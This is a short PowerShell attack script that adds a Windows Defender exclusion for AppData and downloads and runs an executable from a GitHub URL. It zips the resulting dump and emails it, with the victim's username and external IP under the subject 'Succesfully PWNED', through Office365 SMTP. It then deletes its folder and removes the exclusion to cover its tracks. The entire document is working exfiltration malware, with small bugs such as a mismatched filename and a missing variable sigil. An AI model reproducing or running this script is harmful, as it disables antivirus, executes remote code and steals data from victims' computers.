#Adding windows defender exclusionpath
Add-MpPreference -ExclusionPath "$env:appdata"
#Creating the directory we will work on
mkdir "$env:appdata\Microsoft\dump"
Set-Location "$env:appdata\Microsoft\dump"
#Downloading and executing b32.exe
Invoke-WebRequest 'https://github.com/jfkd02ks/playwithcode/raw/main/b64.exe' -OutFile b32.exe
$ArgumentLst = @("--format json")
Start-Process -FilePath “b32.exe” -ArgumentList $ArgumentLst
Remove-Item -Path "$env:appdata\Microsoft\dump\32.exe" -Force
Compress-Archive -Path * -DestinationPath dump.zip
$Random = Get-Random

# Call Home
$UserName = args[0]
$Password = args[1]
$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.office365.com', 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential($UserName, $Password)
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = $UserName
$ReportEmail.To.Add($UserName)
$ip = Invoke-RestMethod "myexternalip.com/raw"
$ReportEmail.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
$ReportEmail.Body = $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
$ReportEmail.Attachments.Add("$env:appdata\Microsoft\dump\dump.zip")
$SMTPInfo.Send($ReportEmail)
$ReportEmail.Dispose()
$SMTPInfo.Dispose()

#Cleanup
cd "$env:appdata"
Remove-Item -Path "$env:appdata\Microsoft\dump" -Force -Recurse
Remove-MpPreference -ExclusionPath "$env:appdata"
